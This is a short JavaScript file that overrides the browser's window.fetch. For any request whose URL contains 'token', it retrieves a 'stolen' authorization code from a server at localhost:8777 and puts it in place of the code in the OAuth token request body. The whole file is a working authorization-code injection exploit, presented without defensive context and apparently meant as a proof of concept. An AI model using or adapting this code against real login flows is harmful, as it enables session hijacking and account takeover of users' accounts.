function getStolenAuthCode() {
  return fetch("http://localhost:8777/auth/code")
  .then(response => {
    if (!response.ok) {
      throw new Error('Failed to fetch authorization code');
    }
    return response.json();
  });
}

const {fetch: originalFetch} = window;

async function updateRequestOptions(resource, options) {
  if (resource.includes('token')) {
    const newOptions = {...options};
    console.log("options body " + JSON.stringify(newOptions, null, 2));

    let resource = await getStolenAuthCode();

    console.log("stolen code is " + resource.code);
    let filteredSearchParams = new URLSearchParams();
    for (let [key, value] of newOptions.body.entries()) {
      if (key !== 'code') {
        filteredSearchParams.append(key, value);
      }
    }
    filteredSearchParams.append('code', resource.code);

    newOptions.body = filteredSearchParams;
    newOptions.method = 'POST';
    newOptions.headers['Content-Type'] = 'application/x-www-form-urlencoded';
    console.log("options body after " + newOptions.body.toString());
    console.log("options after " + JSON.stringify(newOptions, null, 2));
    console.log('params ' + newOptions.body);
    return newOptions;
  }
}

window.fetch = async (...args) => {
  let [resource, options] = args;
  let newOptions = await updateRequestOptions(resource, options);
  if (newOptions !== undefined) {
    console.log("new options body " + JSON.stringify(newOptions, null, 2));
    return await originalFetch(resource, newOptions);
  } else {
    console.log("old options body " + JSON.stringify(options, null, 2));
    return await originalFetch(resource, options);
  }
};


